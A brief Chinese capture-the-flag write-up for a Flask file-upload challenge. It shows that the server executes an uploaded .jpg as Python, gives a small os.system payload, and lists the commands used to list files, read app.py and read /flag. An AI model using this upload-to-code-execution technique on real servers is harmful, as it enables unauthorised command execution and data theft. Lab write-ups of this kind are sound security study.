# Flask_FileUpload

## writeup

直接上传内容为下的jpg文件，服务器会把jpg文件当作py文件来执行，然后可得到返回结果。
```python
# 1.jpg
import os
os.system('xxx')
```

1. 执行`ls`，文件有app.py。

2. `cat app.py`查看app.py中的代码内容，并发现flag写在了根目录下。

3. `cat /flag`查看flag。